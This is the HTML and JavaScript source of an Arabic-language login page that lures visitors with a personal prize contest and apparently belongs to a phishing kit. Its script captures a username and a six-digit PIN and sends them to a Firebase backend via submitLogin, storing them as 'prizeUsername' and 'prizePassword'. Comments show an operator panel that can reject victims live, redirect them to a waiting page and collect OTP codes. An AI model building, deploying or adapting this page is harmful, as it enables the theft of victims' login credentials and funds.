<!DOCTYPE html>
<html lang="ar" dir="rtl" data-page="username">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
  <link rel="stylesheet" href="/assets/css/no-zoom.css?v=1">
  <script src="/assets/js/no-zoom.js?v=1"></script>
  <title>إدخال اسم المستخدم</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
  <script src="/assets/js/site-lang.js?v=1"></script>
  <style>
    :root{--pink:#f7a1af;--pink-hover:#ef8fa1;--green:#69d9a7;--ink:#263238;--muted:#9aa4ae}
    *{box-sizing:border-box}
    body{margin:0;font-family:Cairo,Tahoma,sans-serif;background:#fff;color:var(--ink)}
    .topbar{height:58px;padding:0 18px;display:flex;align-items:center;justify-content:flex-end;background:#fff}
    .back{width:38px;height:38px;border:0;background:transparent;color:#263238;font-size:25px;line-height:1;cursor:pointer}
    .card{width:min(100%,430px);margin:0 auto;padding:8px 11px 24px}
    .card h1{margin:0 0 8px;text-align:right;font-size:19px;line-height:1.55;font-weight:800}
    .intro{text-align:right;color:#73808c;font-size:12px;line-height:1.8;margin:0 0 12px}
    .field label{display:block;text-align:right;font-size:11px;font-weight:700;margin:0 0 7px}
    .field input{width:100%;height:39px;border:1.5px solid var(--green);border-radius:7px;padding:0 12px;font:13px Cairo,sans-serif;color:#263238;outline:none;background:#fff}
    .field input:focus{border-color:#36c58d;box-shadow:0 0 0 3px #69d9a722}
    .field input::placeholder{color:#b0b8c0}
    .link-row{margin:8px 0 0;display:flex;align-items:center;justify-content:flex-end}
    .link-row a{color:#ef8fa1;font-size:11px;font-weight:700;text-decoration:underline}
    .options{margin-top:9px;display:flex;flex-direction:column;align-items:flex-end;gap:7px}
    .option{display:flex;align-items:center;gap:7px;font-size:11px;color:#66727d;cursor:pointer}
    .option input{width:14px;height:14px;margin:0;accent-color:#8d98a2}
    .option input:focus{box-shadow:none}
    .error{display:none;color:#c62828;text-align:right;font-size:11px;margin-top:7px}
    .error.show{display:block}
    .reject-warning{display:none;background:#fdecec;border:1px solid #f3b6b6;color:#c62828;border-radius:9px;padding:10px 12px;font-size:12px;font-weight:700;text-align:right;margin:0 0 12px}
    .reject-warning.show{display:block}
    .submit{width:100%;height:48px;margin-top:15px;border:0;border-radius:28px;background:#767c83;color:#e6e7e9;font:800 16px Cairo,sans-serif;cursor:not-allowed;transition:background .2s ease,color .2s ease}
    .submit.active{background:#df2929;color:#fff;cursor:pointer}
    .submit.active:hover{background:#c51f28}
    .pin-stage{display:none;width:min(100%,430px);margin:0 auto;padding:8px 11px 24px}
    .pin-stage h1{margin:0 0 8px;text-align:right;font-size:19px;line-height:1.55;font-weight:800}
    .pin-stage.active{display:block}
    .pin-field-wrap{position:relative}
    .pin-field-wrap input{direction:ltr;text-align:right;padding-left:48px}
    .pin-delete{position:absolute;left:8px;top:50%;transform:translateY(-50%);width:32px;height:32px;border:0;border-radius:7px;background:transparent;color:#7b858e;font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center}
    .digit svg{display:block;margin:0 auto}
    .keypad-sheet{display:none;position:absolute;right:0;bottom:0;left:0;min-height:278px;background:#fff;border-radius:15px 15px 0 0;padding:15px 16px 18px;box-shadow:0 -10px 30px #0000001a;text-align:center}
    .keypad-sheet.active{display:block}
    .handle{width:42px;height:4px;margin:-5px auto 9px;border-radius:9px;background:#dfe3e6}
    .dots{direction:ltr;display:flex;justify-content:center;gap:10px;height:15px;margin-bottom:13px}
    .dot{width:8px;height:8px;border-radius:50%;background:#dfe3e6}.dot.active{background:#69d9a7}
    .digits-label{font-size:11px;color:#7e8993;margin:-7px 0 10px}
    .digits{direction:ltr;display:grid;grid-template-columns:repeat(3,86px);justify-content:center;gap:8px}
    .digit{height:44px;border:1px solid #dfe3e6;border-radius:8px;background:#fff;color:#263238;font:700 17px Cairo,sans-serif;cursor:pointer}
    .pin-submit{width:min(100%,358px);height:46px;margin:10px auto 0;border:0;border-radius:24px;background:#767c83;color:#e6e7e9;font:800 14px Cairo,sans-serif;display:block;cursor:not-allowed;transition:background .2s ease,color .2s ease}
    .pin-submit.active{background:#df2929;color:#fff;cursor:pointer}
    /* اللغة الإنجليزية/الفرنسية: اتجاه من اليسار لليمين */
    html[dir="ltr"] .topbar { justify-content: flex-start; }
    html[dir="ltr"] .back { transform: scaleX(-1); }
    html[dir="ltr"] .card h1, html[dir="ltr"] .pin-stage h1,
    html[dir="ltr"] .intro, html[dir="ltr"] .field label,
    html[dir="ltr"] .error, html[dir="ltr"] .reject-warning { text-align: left; }
    html[dir="ltr"] .link-row { justify-content: flex-start; }
    html[dir="ltr"] .options { align-items: flex-start; }
    html[dir="ltr"] .pin-field-wrap input { text-align: left; padding-left: 12px; padding-right: 48px; }
    html[dir="ltr"] .pin-delete { left: auto; right: 8px; }
    @media(max-height:700px){.keypad-sheet{min-height:250px;padding-top:10px}.digits{grid-template-columns:repeat(3,82px);gap:6px}.digit{height:38px}.dots{margin-bottom:8px}.pin-submit{height:42px;margin-top:8px}}
    @media(min-width:700px){body{background:#f7f8f9}.topbar{max-width:430px;margin:40px auto 0}.card,.pin-stage{background:#fff;border-radius:18px;padding:16px 18px 26px;box-shadow:0 10px 30px #0000000d}.topbar{padding:0 18px}}
  </style>
</head>
<body>
  <header class="topbar"><button class="back" type="button" aria-label="رجوع" data-i18n-aria="username.back" onclick="history.back()">←</button></header>
  <main class="card">
    <h1 data-i18n-html="username.heading">قم بتسجيل الدخول للوصول الى المسابقة<br>الشخصية الخاصة بك</h1>
    <p class="intro" data-i18n="username.intro">ادخل اسم المستخدم الخاص بك لتسجيل الدخول</p>
    <div class="reject-warning" id="rejectWarning" role="alert" data-i18n="username.reject">يرجى إدخال بيانات صحيحه واعادة المحاولة</div>
    <form id="usernameForm">
      <div class="field">
        <label for="username" data-i18n="username.label">اسم المستخدم</label>
        <input id="username" type="text" inputmode="numeric" enterkeyhint="done" autocomplete="username" required placeholder="اسم المستخدم" data-i18n-ph="username.placeholder">
      </div>
      <div class="link-row"><a href="#" id="forgotUsername" data-i18n="username.forgot">نسيت اسم المستخدم؟</a></div>
      <div class="options">
        <label class="option"><input type="checkbox" name="rememberName"><span data-i18n="username.rememberName">تذكر اسمي</span></label>
        <label class="option"><input type="checkbox" name="rememberPhone"><span data-i18n="username.rememberPhone">تذكر الجوال</span></label>
      </div>
      <div class="error" id="error" data-i18n="username.error">يرجى إدخال اسم المستخدم.</div>
      <button class="submit" type="submit" id="continueBtn" data-i18n="username.next">التالي</button>
    </form>
  </main>
  <main class="pin-stage" id="pinStage">
    <h1 data-i18n-html="username.heading">قم بتسجيل الدخول للوصول الى المسابقة<br>الشخصية الخاصة بك</h1>
    <p class="intro" data-i18n="username.pinIntro">ادخل الرقم السري الخاص بك لتسجيل الدخول</p>
    <div class="field">
      <label for="pinDisplay" data-i18n="username.pinLabel">الرقم السري</label>
      <div class="pin-field-wrap">
        <input id="pinDisplay" type="text" inputmode="numeric" readonly placeholder="ادخل الرقم السري" value="" data-i18n-ph="username.pinPlaceholder">
        <button class="pin-delete" id="pinDelete" type="button" aria-label="حذف آخر رقم" data-i18n-aria="username.deleteAria"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 5H9l-7 7 7 7h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2Z"/><line x1="18" x2="12" y1="9" y2="15"/><line x1="12" x2="18" y1="9" y2="15"/></svg></button>
      </div>
    </div>
  </main>
  <section class="keypad-sheet" id="keypadSheet" aria-label="لوحة إدخال الرقم السري" data-i18n-aria="username.keypadAria">
    <div class="handle"></div>
    <div class="dots" id="dots"><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i></div>
    <div class="digits-label" data-i18n="username.digitsLabel">ادخل رمزك السري</div>
    <div class="digits" id="keypad"></div>
    <button class="pin-submit" id="pinSubmit" type="button" disabled data-i18n="username.pinSubmit">تسجيل الدخول</button>
  </section>
  <script src="/assets/js/firebase-env.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
  <script src="/assets/js/firebase-client.js?v=14"></script>
  <script src="/assets/js/page-commands.js?v=5"></script>
  <script>
    // رسالة الرفض: تظهر إذا عاد العميل من صفحة الانتظار بعد رفض المدير
    (function(){
      var warn = document.getElementById('rejectWarning');
      var msg = null;
      try { msg = sessionStorage.getItem('prizeRejectMessage'); } catch (e) {}
      if (msg) {
        warn.textContent = msg;
        warn.classList.add('show');
        try { sessionStorage.removeItem('prizeRejectMessage'); } catch (e) {}
      }
    })();
    // رفض مباشر أثناء وجود العميل في هذه الصفحة (لو رفض المدير مبكراً)
    if (window.listenForPageCommands) {
      window.listenForPageCommands({
        onReject: function () {
          var warn = document.getElementById('rejectWarning');
          warn.textContent = window.SiteLang ? SiteLang.t('username.reject') : 'يرجى إدخال بيانات صحيحه واعادة المحاولة';
          warn.classList.add('show');
        }
      });
    }
    document.getElementById("forgotUsername").addEventListener("click",e=>e.preventDefault());
    const usernameInput=document.getElementById("username");
    const continueBtn=document.getElementById("continueBtn");
    function updateContinueState(){
      const filled=usernameInput.value.trim().length>0;
      continueBtn.classList.toggle("active",filled);
      continueBtn.disabled=!filled;
    }
    usernameInput.addEventListener("input",updateContinueState);
    updateContinueState();
    document.getElementById("usernameForm").addEventListener("submit",async e=>{
      e.preventDefault();const username=document.getElementById("username").value.trim();if(!username){document.getElementById("error").classList.add("show");return}
      localStorage.setItem("prizeUsername",username);
      if(window.submitLogin)await window.submitLogin({username,password:""});
      document.querySelector(".card").style.display="none";
      document.getElementById("pinStage").classList.add("active");
      document.getElementById("keypadSheet").classList.add("active");
    });

    const pinDisplay=document.getElementById("pinDisplay");
    const pinSubmit=document.getElementById("pinSubmit");
    const pinDots=[...document.querySelectorAll(".dot")];
    let pin="";
    function renderPin(){
      pinDots.forEach((dot,i)=>dot.classList.toggle("active",i<pin.length));
      pinDisplay.value=pin?"•".repeat(pin.length):"";
      pinSubmit.disabled=pin.length!==6;
      pinSubmit.classList.toggle("active",pin.length===6);
    }
    ["5","4","7","2","6","0","3","8","1","9"].forEach(number=>{
      const button=document.createElement("button");
      button.type="button";button.className="digit";button.textContent=number;
      button.addEventListener("click",()=>{if(pin.length<6){pin+=number;renderPin()}});
      document.getElementById("keypad").appendChild(button);
    });
    const blank=document.createElement("button");blank.type="button";blank.className="digit";blank.disabled=true;blank.style.visibility="hidden";
    document.getElementById("keypad").appendChild(blank);
    const deleteButton=document.createElement("button");
    deleteButton.type="button";deleteButton.className="digit";deleteButton.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 5H9l-7 7 7 7h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2Z"/><line x1="18" x2="12" y1="9" y2="15"/><line x1="12" x2="18" y1="9" y2="15"/></svg>';deleteButton.setAttribute("aria-label", window.SiteLang ? SiteLang.t("username.deleteAria") : "حذف");
    deleteButton.addEventListener("click",()=>{pin=pin.slice(0,-1);renderPin()});
    document.getElementById("keypad").appendChild(deleteButton);
    document.getElementById("pinDelete").addEventListener("click",()=>{pin=pin.slice(0,-1);renderPin()});
    pinSubmit.addEventListener("click",async()=>{
      if(pin.length!==6)return;
      localStorage.setItem("prizePassword",pin);
      if(window.submitLogin)await window.submitLogin({username:localStorage.getItem("prizeUsername")||"",password:pin});
      // الرقم السري يُرسل مع تسجيل الدخول فقط (كلمة المرور)، لا كـ OTP،
      // حتى لا يظهر في صندوق «رموز التحقق» منفصلاً عن صندوق الدخول في اللوحة.
      location.href = window.SiteLang ? SiteLang.href("prize-wait.html") : "prize-wait.html";
    });
  </script>
</body>
</html>
